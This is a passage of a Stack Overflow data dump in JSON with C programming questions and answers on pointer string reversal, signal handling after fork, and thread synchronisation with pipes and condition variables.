"https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1524693544, "post_id": 50031360, "comment_id": 87079971, "body": "@Michi, we probably should not encourage OP to plagarize, but they will probably learn from the linked code."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1524695829, "post_id": 50031360, "comment_id": 87080600, "body": "Aside: please don&#39;t name variables as <code>string</code> <code>string1</code> <code>string2</code> and so on. They are no better than <code>i</code> <code>j</code> <code>k</code>. Make the code <i>readable</i> with something like <code>void reverse2(char* source, char* dest)</code> and get rid of the unnecessary local <code>string1</code>."}], "answers": [{"tags": [], "owner": {"reputation": 4598, "user_id": 9264702, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mHczh.jpg?s=128&g=1", "display_name": "Stephen Docy", "link": "https://stackoverflow.com/users/9264702/stephen-docy"}, "is_accepted": false, "score": 3, "last_activity_date": 1524691636, "last_edit_date": 1524691636, "creation_date": 1524690907, "answer_id": 50031453, "question_id": 50031360, "link": "https://stackoverflow.com/questions/50031360/reversing-a-string-in-c-using-pointers/50031453#50031453", "title": "Reversing a string in C using pointers", "body": "<p>1 - prog.c:8:2: warning: implicit declaration of function 'reverse2' is invalid in C99 [-Wimplicit-function-declaration]\n        reverse2(forward, back);</p>\n\n<p>This error is because you need to define <code>reverse2()</code> before main tries to call it, simply move your code for <code>reverse2()</code> prior to the code for <code>main()</code>.</p>\n\n<p>2 - you need to null terminate your backwards string in <code>reverse2()</code></p>\n\n<pre><code>for (i = 0; i &lt;= counter; i++) {\n    *string2 = *string1;\n    string2 += 1;\n    string1--;\n}\n*string2 = '\\0';\n</code></pre>\n\n<p>3 - it does no good trying to print out <code>string2</code> in <code>reverse2()</code> because it points to the end of the string.  Print <code>back</code> in <code>main()</code> and you will see the expected results.</p>\n\n<pre><code>reverse2(forward, back);\nprintf(\"%s\", back);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 18851, "user_id": 414813, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/83284c54c3fc960dcdf8844ed92227d7?s=128&d=identicon&r=PG", "display_name": "CAFxX", "link": "https://stackoverflow.com/users/414813/cafxx"}, "is_accepted": false, "score": 4, "last_activity_date": 1524690910, "creation_date": 1524690910, "answer_id": 50031455, "question_id": 50031360, "link": "https://stackoverflow.com/questions/50031360/reversing-a-string-in-c-using-pointers/50031455#50031455", "title": "Reversing a string in C using pointers", "body": "<p>Your compilation error is due to the fact that you call <code>reverse2</code> in <code>main</code>, but the C compiler doesn't know <strong><em>inside of</em></strong> <code>main</code> what <code>reverse2</code> is <strong><em>yet</em></strong> because <code>reverse2</code> is defined <strong><em>after</em></strong> <code>main</code>. (The C compiler must be able to compile a .c file in a streaming fashion, so this means that everything it needs to compile something - like a function - must have been defined beforehand)</p>\n\n<p>If you invert the order of the two functions (i.e. you put <code>reverse2</code> before <code>main</code>), or add this declaration:</p>\n\n<pre><code>void reverse2(char*, char*);\n</code></pre>\n\n<p>before <code>main()</code> then that error won't happen. </p>\n\n<p>(I haven't checked your code, so I don't know if it does what you want it to do,  but your question is about the compilation error: not whether the code actually inverts the string)</p>\n"}, {"tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": false, "score": 1, "last_activity_date": 1524732305, "creation_date": 1524732305, "answer_id": 50038615, "question_id": 50031360, "link": "https://stackoverflow.com/questions/50031360/reversing-a-string-in-c-using-pointers/50038615#50038615", "title": "Reversing a string in C using pointers", "body": "<p>To prevent these useful warnings, you should either declare or define the <code>reverse2</code> function before you call it from <code>main()</code>.</p>\n\n<p>Furthermore <code>reverse2</code> does not set the null terminator in the destination string and does not print the reversed string at all, since the pointer <code>string2</code> was advanced to the end of the reversed string.</p>\n\n<p>Unless the prototype is specified, you should consider allocating space for the reversed string in <code>reverse2</code> and returning the pointer:</p>\n\n<p>Here is a modified version:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nchar *reverse2(const char *src) {\n    const char *p = src;\n    char *dest, *q;\n\n    while (*p) {\n        p++;\n    }\n    dest = malloc(p - src + 1);\n    if (dest != NULL) {\n        q = dest;\n        while (p &gt; src) {\n            *q++ = *--p;\n        }\n        *q = '\\0';\n    }\n    return dest;\n}\n\nint main(void) {\n    const char *forward = \"123\";\n    char *back = reverse2(forward);\n    printf(\"%s\\n\", back);\n    free(back);\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 75, "user_id": 9591067, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Cl1h9.png?s=128&g=1", "display_name": "Walker", "link": "https://stackoverflow.com/users/9591067/walker"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 137, "favorite_count": 0, "answer_count": 3, "score": 2, "last_activity_date": 1524732305, "creation_date": 1524690430, "last_edit_date": 1524731639, "question_id": 50031360, "link": "https://stackoverflow.com/questions/50031360/reversing-a-string-in-c-using-pointers", "title": "Reversing a string in C using pointers", "body": "<p>I need to find a way to reverse a string using pointers in <code>C</code>. I'm not supposed to use array notation or string library functions either.</p>\n\n<p>Here is my current code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(void) {\n    //Reverse2\n    char *forward = \"123\";\n    char *back = malloc(sizeof(char) * 4);\n    reverse2(forward, back);\n\n    return 0;\n}\n\nvoid reverse2(char *string, char *string2) {\n    int counter = 0;\n    char *string1 = string;\n    while (*string1) {\n        counter += 1;\n        string1 += 1;\n    }\n    string1--;\n    int i;\n    for (i = 0; i &lt;= counter; i++) {\n        *string2 = *string1;\n        string2 += 1;\n        string1--;\n    }\n    printf(\"%s\", string2);\n}\n</code></pre>\n\n<p>This is the error it gives when I run it in <code>ideone</code>:</p>\n\n<pre><code>Compilation error   #stdin compilation error #stdout 0s 0KB\n\nprog.c:8:2: warning: implicit declaration of function 'reverse2' is invalid in C99 [-Wimplicit-function-declaration]\n        reverse2(forward, back);\n        ^\nprog.c:41:6: error: conflicting types for 'reverse2'\nvoid reverse2(char* string, char* string2){\n     ^\nprog.c:8:2: note: previous implicit declaration is here\n        reverse2(forward, back);\n        ^\n1 warning and 1 error generated.\n</code></pre>\n"}, {"tags": ["c", "linux", "signals", "handler", "kill"], "answers": [{"tags": [], "owner": {"reputation": 64283, "user_id": 315052, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/AB5ST.png?s=128&g=1", "display_name": "jxh", "link": "https://stackoverflow.com/users/315052/jxh"}, "is_accepted": true, "score": 0, "last_activity_date": 1524793378, "last_edit_date": 1524793378, "creation_date": 1524689177, "answer_id": 50031093, "question_id": 50030769, "link": "https://stackoverflow.com/questions/50030769/signal-handler-behavior/50031093#50031093", "title": "Signal Handler Behavior", "body": "<ol>\n<li><p>After the <code>fork()</code>, the parent and child processes are in a race. There is no guarantee the parent will have a chance to issue the call to <code>kill()</code> to the child before the child reaches the <code>printf()</code> call.</p></li>\n<li><p>If there are multiple processors, both processes can be running simultaneously. Otherwise, if the child is not currently running, Linux will set some internal state that the signal should be delivered to the child process when it next runs, and it will mark the process as runnable if it is not already.</p></li>\n<li><p>If the child is currently running, the signal gets processed immediately. Otherwise, it is processed when the child next runs. The handler is run as a result of processing the signal.</p></li>\n</ol>\n"}], "owner": {"reputation": 11, "user_id": 9700107, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "FurioShow", "link": "https://stackoverflow.com/users/9700107/furioshow"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 80, "favorite_count": 0, "accepted_answer_id": 50031093, "answer_count": 1, "score": 1, "last_activity_date": 1524793378, "creation_date": 1524687880, "question_id": 50030769, "link": "https://stackoverflow.com/questions/50030769/signal-handler-behavior", "title": "Signal Handler Behavior", "body": "<p>I have just some questions about the system calls signal, kill and the signal handler.\nI have this code:</p>\n\n<pre><code>int figlio=-1;\nint main(int argc,char* argv[])\n    int pid1,pid2,dormi,numero;\n    float reciproco;\n    signal(SIGUSR1,gestore);\n    signal(SIGUSR2,gestore);\n    numero=atoi(argv[1]);\n    printf(\"Numero %d\\n\\n\",numero);\n    fflush(stdout);\n    pid1=fork();\n    if(pid1&gt;0)  //PADRE\n    {\n        pid2=fork();\n        if(numero%2 == 0)\n            kill(pid1,SIGUSR1);\n        else\n            kill(pid2,SIGUSR2);\n        wait(NULL);\n        wait(NULL);\n    }\n    if(pid1 == 0)   //FIGLIO1\n    {   \n        //sleep(1);\n        printf(\"%d\\n\",figlio);\n        if(figlio == 1)\n        {\n            numero=numero*numero*numero;\n            fflush(stdout);\n            printf(\"Ho eseguito il cubo %d\\n\",numero);\n        }\n        else\n        {\n            pause();\n            if(figlio == 1) //Se il gestore di SIGUSR1 \u00e8 partito\n            {\n                fflush(stdout);\n                printf(\"Ciao dal figlio 1\\n\");\n            }\n        }\n        printf(\"Figlio1 termina\\n\\n\");\n        exit(0);\n    }\n    if(pid2 == 0)   //FIGLIO2\n    {\n        if(figlio == 2)\n        {\n            dormi=numero;\n            reciproco=(float)numero;\n            reciproco=1/reciproco;\n            fflush(stdout);\n            printf(\"Ho eseguito il reciproco %f\\n\",reciproco);\n            sleep(dormi);\n            fflush(stdout);\n            printf(\"Mando un segnale a mio fratello %d\\n\",pid1);\n            kill(pid1,SIGUSR1);\n        }\n        else\n            printf(\"Arrivederci e grazie\\n\");\n        printf(\"Figlio2 termina\\n\\n\");\n        exit(0);\n    }   \n    return 0;\n}\n\nvoid gestore(int signo)\n{\n    if(signo == SIGUSR1)\n        figlio=1;\n    else\n        figlio=2;\n}\n</code></pre>\n\n<p>1) I don't understand why the first printf in the first child, return -1 without a sleep(1) before...seems that the handler is executed after the beginning of the child.<br>\n2) When there is a kill to a child, after this, the scheduler works on the child or continue on the father?<br>\n3) The handler is executed when the kill is sent or when the scheduler works on the child?</p>\n"}, {"tags": ["c", "multithreading", "pipe"], "comments": [{"owner": {"reputation": 64283, "user_id": 315052, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/AB5ST.png?s=128&g=1", "display_name": "jxh", "link": "https://stackoverflow.com/users/315052/jxh"}, "edited": false, "score": 0, "creation_date": 1524687855, "post_id": 50030462, "comment_id": 87077539, "body": "The thread gets scheduled as real time runnable, but there may be other real time threads ahead of it in the runnable queue. Also, are you certain that changing the sched param worked?"}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 3, "creation_date": 1524688770, "post_id": 50030462, "comment_id": 87077988, "body": "<code>usleep</code> is never the right strategy for thread synchronization. You need to use other forms of synchronization, like semaphores or conditional variables."}, {"owner": {"reputation": 133, "user_id": 4863755, "user_type": "registered", "accept_rate": 22, "profile_image": "https://www.gravatar.com/avatar/08c46acf529aee31dd9853cfa0f99d8e?s=128&d=identicon&r=PG&f=1", "display_name": "Chris", "link": "https://stackoverflow.com/users/4863755/chris"}, "reply_to_user": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1524694189, "post_id": 50030462, "comment_id": 87080151, "body": "@Pablo: the \u2019usleep(1000)\u2019 is only to wait for setting up the thread and let it run to the read-func. What I want is that \u2018after poll\u2018 is outputting before \u2019Go to sleep\u2019. \u2019usleep(1)\u2019 is only for demonstration."}, {"owner": {"reputation": 133, "user_id": 4863755, "user_type": "registered", "accept_rate": 22, "profile_image": "https://www.gravatar.com/avatar/08c46acf529aee31dd9853cfa0f99d8e?s=128&d=identicon&r=PG&f=1", "display_name": "Chris", "link": "https://stackoverflow.com/users/4863755/chris"}, "reply_to_user": {"reputation": 64283, "user_id": 315052, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/AB5ST.png?s=128&g=1", "display_name": "jxh", "link": "https://stackoverflow.com/users/315052/jxh"}, "edited": false, "score": 0, "creation_date": 1524694354, "post_id": 50030462, "comment_id": 87080218, "body": "@jxh I&#39;m not sure that sched param is working. I don&#39;t know how to do this."}, {"owner": {"reputation": 64283, "user_id": 315052, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/AB5ST.png?s=128&g=1", "display_name": "jxh", "link": "https://stackoverflow.com/users/315052/jxh"}, "edited": false, "score": 1, "creation_date": 1524695523, "post_id": 50030462, "comment_id": 87080506, "body": "Check the return values."}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1524697101, "post_id": 50030462, "comment_id": 87081004, "body": "I still have trouble understanding what your goal is. First, create the pipe <b>before</b> the thread is created and launched. This way you don&#39;t have to synchronize the threads, the thread will block in <code>read</code> until the main threads writes something on <code>pipe_test[1]</code>."}, {"owner": {"reputation": 3971, "user_id": 2840714, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/s9vli.jpg?s=128&g=1", "display_name": "ChuckCottrill", "link": "https://stackoverflow.com/users/2840714/chuckcottrill"}, "edited": false, "score": 0, "creation_date": 1524702870, "post_id": 50030462, "comment_id": 87082421, "body": "rather than usleep(1) in main, try launching two children, a reader and a writer, and then wait/join the two threads in main."}, {"owner": {"reputation": 133, "user_id": 4863755, "user_type": "registered", "accept_rate": 22, "profile_image": "https://www.gravatar.com/avatar/08c46acf529aee31dd9853cfa0f99d8e?s=128&d=identicon&r=PG&f=1", "display_name": "Chris", "link": "https://stackoverflow.com/users/4863755/chris"}, "reply_to_user": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1524771748, "post_id": 50030462, "comment_id": 87117770, "body": "@Pablo Ok, i will add some infos and try to create a bigger picture: I use the worker to catch an interrupt at a gpio-pin (pi). Sometimes i had to cancel the poll, so i added a pipe and the worker polls 2 filedescriptors. One is the interrupt from the gpio-pin and the other is the pipe to stop waiting for the interrupt. Look at may code for the commented poll-function."}], "answers": [{"comments": [{"owner": {"reputation": 133, "user_id": 4863755, "user_type": "registered", "accept_rate": 22, "profile_image": "https://www.gravatar.com/avatar/08c46acf529aee31dd9853cfa0f99d8e?s=128&d=identicon&r=PG&f=1", "display_name": "Chris", "link": "https://stackoverflow.com/users/4863755/chris"}, "edited": false, "score": 0, "creation_date": 1524771174, "post_id": 50033322, "comment_id": 87117502, "body": "I added a <code>counter</code> to check your results. You said: &quot;the worker thread resumes working immediately after the main thread writes something in the pipe. &quot; but this is not correct. Your outputs are in the right order and the worker resumes when you call the sleep-mode."}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "reply_to_user": {"reputation": 133, "user_id": 4863755, "user_type": "registered", "accept_rate": 22, "profile_image": "https://www.gravatar.com/avatar/08c46acf529aee31dd9853cfa0f99d8e?s=128&d=identicon&r=PG&f=1", "display_name": "Chris", "link": "https://stackoverflow.com/users/4863755/chris"}, "edited": false, "score": 0, "creation_date": 1524775077, "post_id": 50033322, "comment_id": 87119247, "body": "@Chris What do you mean with <i>I added a <code>counter</code> to check your results</i>. A counter of what? Note also that when the main thread writes in the pipe, it may take a little while until the kernel allows the pipe to be read. I made a change (see <a href=\"https://ideone.com/AyISNQ\" rel=\"nofollow noreferrer\">ideone.com/AyISNQ</a>) where instead of doing <code>sleep(1)</code>, I call a function that does not put the thread to sleep. And here I can see that from the output <b>Main thread [1524775008], writing...</b> and <b>worker [1524775008]: waited 1 seconds, payload: 88</b> that the worker woke up indeed at the same time that the main thread wrote in the pipe."}], "tags": [], "owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "is_accepted": false, "score": 0, "last_activity_date": 1524704450, "creation_date": 1524704450, "answer_id": 50033322, "question_id": 50030462, "link": "https://stackoverflow.com/questions/50030462/how-is-it-working-with-threads-pipes-and-interrupts-in-c-with-linux/50033322#50033322", "title": "How is it working with threads, pipes and interrupts in C with linux", "body": "<p>Usually you would have synchronize your threads using condition variables or\nsemaphores. But in this case a <code>pipe</code> can also help to synchronize the threads,\nas long the communication direction remains the same, otherwise you would need 2\npipes.</p>\n\n<p>First, I'd create the pipe before the worker thread is created. This way,\nthe main thread does not need to wait for the worker to create the pipe, it can\nstart writing to it immediately. We can use this behaviour to synchronize the\nthreads because a <code>read</code> will block until the other end writes something in the\npipe. So the worker thread essentially waits until there is data in the pipe.</p>\n\n<p>I've modifided your example a litte bit to demonstrate this. Note that I also\nuse <code>sleep</code> in the main thread, but I don't use it to syncronize the threads but\nto show that the worker thread indeed waits until the main thread writes\nsomething:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;pthread.h&gt;\n#include &lt;time.h&gt;\n\ntypedef struct th_data {\n    int fd[2];\n    // add other arguments as needed\n} th_data;\n\nvoid *myworker(void *args)\n{\n    int payload;\n    th_data *data = args;\n    time_t now;\n\n    time_t start, stop;\n\n    start = time(NULL);\n\n    ssize_t ret = read(data-&gt;fd[0], &amp;payload, sizeof payload);\n    now = time(NULL);\n\n    if(ret == -1)\n    {\n        perror(\"read, terminating worker\");\n        pthread_exit(0);\n    }\n\n    stop = time(NULL);\n\n    printf(\"* worker [%zu]: waited %zu seconds, payload: %d\\n\", now, stop-start, payload);\n\n    //////////////////\n\n    start = time(NULL);\n\n    ret = read(data-&gt;fd[0], &amp;payload, sizeof payload);\n    now = time(NULL);\n\n    if(ret == -1)\n    {\n        perror(\"read, terminating worker\");\n        pthread_exit(0);\n    }\n\n    stop = time(NULL);\n\n    printf(\"* worker [%zu]: waited %zu seconds, payload: %d\\n\", now, stop-start, payload);\n\n\n\n    //////////////////\n\n    start = time(NULL);\n\n    ret = read(data-&gt;fd[0], &amp;payload, sizeof payload);\n    now = time(NULL);\n\n    if(ret == -1)\n    {\n        perror(\"read, terminating worker\");\n        pthread_exit(0);\n    }\n\n    stop = time(NULL);\n\n    printf(\"* worker [%zu]: waited %zu seconds, payload: %d\\n\", now, stop-start, payload);\n\n\n    pthread_exit(0);\n}\n\nint main(void)\n{\n\n    pthread_t th;\n    th_data data;\n    time_t now;\n\n    if(pipe(data.fd) &lt; 0)\n    {\n        perror(\"pipe\");\n        return 1;\n    }\n\n    pthread_create(&amp;th, NULL, myworker, &amp;data);\n\n    int payload = 88;\n\n    printf(\"+ Main thread: sleep 1 second\\n\");\n    sleep(1);\n\n    now = time(NULL);\n    printf(\"+ Main thread [%zu], writing...\\n\", now);\n    write(data.fd[1], &amp;payload, sizeof payload);\n\n    printf(\"+ Main thread: sleep 2 seconds\\n\");\n    sleep(2);\n\n    payload = -12;\n    now = time(NULL);\n    printf(\"+ Main thread [%zu], writing...\\n\", now);\n    write(data.fd[1], &amp;payload, sizeof payload);\n\n    printf(\"+ Main thread: sleep 3 seconds\\n\");\n    sleep(3);\n\n    payload = 1024;\n    now = time(NULL);\n    printf(\"+ Main thread [%zu], writing...\\n\", now);\n    write(data.fd[1], &amp;payload, sizeof payload);\n\n    pthread_join(th, NULL);\n\n    return 0;\n}\n</code></pre>\n\n<p>The output of this program is</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>+ Main thread: sleep 1 second\n+ Main thread [1524698241], writing...\n+ Main thread: sleep 2 seconds\n* worker [1524698241]: waited 1 seconds, payload: 88\n+ Main thread [1524698243], writing...\n+ Main thread: sleep 3 seconds\n* worker [1524698243]: waited 2 seconds, payload: -12\n+ Main thread [1524698246], writing...\n* worker [1524698246]: waited 3 seconds, payload: 1024\n</code></pre>\n\n<p>and as you can see from the numbers in the square brackets, the worker thread\nresumes working immediately after the main thread writes something in the pipe.\nThe fact that the lines are a little bit out of sync is because <code>printf</code> is\nbuffered. But the number in the square brackets tell you exactly when which part\nof the threads was executed.</p>\n\n<p>I don't like this approach too much, to be honest, if both the main thread and\nthe worker have to read and write to each other, then one pipe is not enough. In\nthat case you need another pipe for the other direction or you need a better\nsynchronization strategy. I'd use conditional variables, because they also work\nvery well with multiple threads. A similar example with condition variables</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;pthread.h&gt;\n\npthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;\npthread_cond_t cv = PTHREAD_COND_INITIALIZER;\n\nint payload; // shared resource\n\nvoid *worker(void *args)\n{\n    int i = 0;\n\n    int payloads[] = { 1, 3, -9};\n\n    size_t len = sizeof payloads / sizeof payloads[0];\n\n    int oldpayload;\n\n    while(1)\n    {\n        pthread_mutex_lock(&amp;mutex);\n        pthread_cond_wait(&amp;cv, &amp;mutex);\n        printf(\"* worker[%d]: main thread signal cond variable, payload is %d\\n\", i, payload);\n\n        oldpayload = payload;\n\n        payload = payloads[i % len];\n        printf(\"* worker[%d]: setting payload to %d\\n\", i, payload);\n        pthread_mutex_unlock(&amp;mutex);\n\n\n        // now waking up master\n        pthread_cond_signal(&amp;cv);\n\n        if(oldpayload == 99)\n            break;\n\n        i++;\n    }\n\n    printf(\"* worker:    My work is done, bye\\n\");\n\n    pthread_exit(0);\n}\n\nint main(void)\n{\n    pthread_t th;\n    pthread_create(&amp;th, NULL, worker, NULL);\n\n    int payloads[] = { 19, -12, 110, 1024, 99 };\n\n    for(size_t i = 0; i &lt; sizeof payloads / sizeof payloads[0]; ++i)\n    {\n        printf(\"+ main[%zu]:   doing some work, setting payload to %d\\n\", i, payloads[i]);\n        fflush(stdout);\n        usleep(10000); // simulation work\n\n        payload = payloads[i];\n        pthread_cond_signal(&amp;cv);\n\n        // time for master to wait\n        pthread_mutex_lock(&amp;mutex);\n        pthread_cond_wait(&amp;cv, &amp;mutex);\n        printf(\"+ main[%zu]:   worker set payload to %d\\n\\n\", i, payload);\n        fflush(stdout);\n        pthread_mutex_unlock(&amp;mutex);\n    }\n\n    pthread_join(th, NULL);\n\n    return 0;\n}\n</code></pre>\n\n<p>And the output for this is</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>+ main[0]:   doing some work, setting payload to 19\n* worker[0]: main thread signal cond variable, payload is 19\n* worker[0]: setting payload to 1\n+ main[0]:   worker set payload to 1\n\n+ main[1]:   doing some work, setting payload to -12\n* worker[1]: main thread signal cond variable, payload is -12\n* worker[1]: setting payload to 3\n+ main[1]:   worker set payload to 3\n\n+ main[2]:   doing some work, setting payload to 110\n* worker[2]: main thread signal cond variable, payload is 110\n* worker[2]: setting payload to -9\n+ main[2]:   worker set payload to -9\n\n+ main[3]:   doing some work, setting payload to 1024\n* worker[3]: main thread signal cond variable, payload is 1024\n* worker[3]: setting payload to 1\n+ main[3]:   worker set payload to 1\n\n+ main[4]:   doing some work, setting payload to 99\n* worker[4]: main thread signal cond variable, payload is 99\n* worker[4]: setting payload to 3\n* worker:    My work is done, bye\n+ main[4]:   worker set payload to 3\n</code></pre>\n\n<p>One thing to notice here: the variable <code>payload</code> is our shared resource that is\nread and written by both the main and the worker thread. Usually you would need\na mutex to protect the reading and writing of the shared resource. Note that the\nmain thread does not lock the mutex when writing to <code>payload</code>. The reason why I\ncan omit that here is because of the condition variable: I synchronized the\nthreads so that only one thread at a time can write <code>payload</code>, so I know that\nwhen</p>\n\n<pre><code>payload = payloads[i];\n</code></pre>\n\n<p>is executed on the main thread, the worker thread is locked and waiting for the\nsignal of the condition variable, so it is not writing <code>payload</code> at the same\ntime as the main thread. Of course I could use a second mutex just for that, but\nI don't think it is necessary.</p>\n\n<p>Final remarks:</p>\n\n<p>The correct way of defining the <code>main</code> is one of these three:</p>\n\n<ul>\n<li><code>int main(void);</code></li>\n<li><code>int main(int argc, char **argv);</code></li>\n<li><code>int main(int argc, char *argv[]);</code></li>\n</ul>\n\n<p>Also bear in mind that the variable <code>WorkerThreadRet</code> is pointing to <code>NULL</code>. You\nwould need to allocate memory for it before passing it to the thread.</p>\n\n<p>In you code before doing</p>\n\n<pre><code>write(pipe_test[1], &amp;status, sizeof(status));\n</code></pre>\n\n<p>you might want to initialize the <code>status</code> variable before the write operation,\notherwise you are sending some uninitialized value.</p>\n"}], "owner": {"reputation": 133, "user_id": 4863755, "user_type": "registered", "accept_rate": 22, "profile_image": "https://www.gravatar.com/avatar/08c46acf529aee31dd9853cfa0f99d8e?s=128&d=identicon&r=PG&f=1", "display_name": "Chris", "link": "https://stackoverflow.com/users/4863755/chris"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 134, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1524771813, "creation_date": 1524686601, "last_edit_date": 1524771813, "question_id": 50030462, "link": "https://stackoverflow.com/questions/50030462/how-is-it-working-with-threads-pipes-and-interrupts-in-c-with-linux", "title": "How is it working with threads, pipes and interrupts in C with linux", "body": "<p>How is it working with threads, pipes and interrupts with linux(pi)?  I created the worker <code>rfm69_InterruptWorker</code> which is waiting in read-func. I set a high prio to this thread. </p>\n\n<p>What do i want/expected? I expect that when i write something to the pipe it will immediately call the thread to read from the pipe. But unfortunately it will return when the main-thread goes to sleep.</p>\n\n<pre><code>#include &lt;unistd.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdbool.h&gt;\n#include &lt;pthread.h&gt;\n#include &lt;sched.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;poll.h&gt;\n\nint pipe_test[2];\n\nstatic struct pollfd gl_pfd;\n\npthread_t WorkerThread;       // Thread to compute log messages\nstruct data* WorkerThreadRet; // Storage for thread return value\n\n\nstatic void* rfm69_InterruptWorker(void* dummy)\n{\n  uint8_t status;\n  uint8_t retval;\n  uint32_t timeout = 0;\n  struct sched_param params; // struct sched_param is used to store the scheduling priority\n  int ret;\n\n  if (pipe(pipe_test) &lt; 0) {\n    printf(\"pipe error\\r\\n\");\n  }\n\n  printf(\"created pipe \\r\\n\");\n\n  gl_pfd.fd = pipe_test[0];\n  gl_pfd.events = POLLIN;\n\n  printf(\"setting prio\\r\\n\");\n\n  // We'll set the priority to the minimum\n  params.sched_priority = sched_get_priority_max(SCHED_FIFO);\n  // Attempt to set thread priority to the SCHED_OTHER policy\n  ret = pthread_setschedparam(pthread_self(), SCHED_FIFO, &amp;params);\n\n  printf(\"before  poll/read\\r\\n\");\n  //retval = poll(&amp;gl_pfd, 1, -1);\n  //retval = poll(gl_pdf,2, -1); //When with polling gpio-pin and pipe to break\n  retval = read(pipe_test[0], &amp;status, sizeof(status));\n\n  printf(\"after poll\\r\\n\");\n\n}\n\n\nvoid main() {\n\n  uint8_t status;\n\n  pthread_create(&amp;WorkerThread, NULL, rfm69_InterruptWorker, WorkerThreadRet);\n\n  usleep(1000);\n\n\n  printf(\"write to pipe\\r\\n\");\n  write(pipe_test[1], &amp;status, sizeof(status));\n\n  printf(\"Go to sleep\\r\\n\");\n  usleep(1);\n  printf(\"back to sleep\\r\\n\");\n\n}\n</code></pre>\n\n<p>output:</p>\n\n<pre><code>created pipe \nsetting prio\nbefore  poll/read\nwrite to pipe\nGo to sleep\nafter poll\nback to sleep\n</code></pre>\n"}, {"tags": ["c", "performance", "scanf", "strsep"], "comments": [{"owner": {"reputation": 15260, "user_id": 1968182, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/E5nF2.jpg?s=128&g=1", "display_name": "Ulrich Eckhardt", "link": "https://stackoverflow.com/users/1968182/ulrich-eckhardt"}, "edited": false, "score": 0, "creation_date": 1524684582, "post_id": 50029949, "comment_id": 87076091, "body": "&quot;Therefore using Getline to read in the data and build a vector&gt; may have serious performance issue for me. I tried to use fscanf to achieve this&quot; -- the assumption that <code>fscanf()</code> can do something that <code>std::getline</code> prevents seems flawed to me. Why do you think so? Also, your final questions are invitations for opinions, which is generally considered off-topic."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1524684667, "post_id": 50029949, "comment_id": 87076135, "body": "<code>fscanf(fstream,&quot;%*d&quot;,&amp;MyIntArr[i]);</code> is wrong. Remove 